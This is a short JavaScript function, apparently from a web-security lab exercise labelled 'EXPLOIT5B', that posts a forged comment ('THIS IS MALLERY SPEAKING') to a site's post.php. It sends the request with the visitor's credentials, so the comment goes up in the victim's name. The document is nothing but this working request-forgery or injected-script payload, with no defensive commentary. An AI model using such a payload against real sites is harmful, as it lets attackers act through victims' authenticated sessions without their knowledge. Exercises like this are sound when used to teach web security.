function leavePost(){
  var url = window.location.href.split("/");
  url.pop();
  url.push("post.php");
  url = url.join("/");

  console.log(url);
  var query = "title=EXPLOIT5B&comment=THIS IS MALLERY SPEAKING&type=1&form=content&";

  var xmlHttp = new XMLHttpRequest();
  xmlHttp.withCredentials = true;
  xmlHttp.open( "POST", url, false );
  xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  
  xmlHttp.send( query );
  return xmlHttp;
};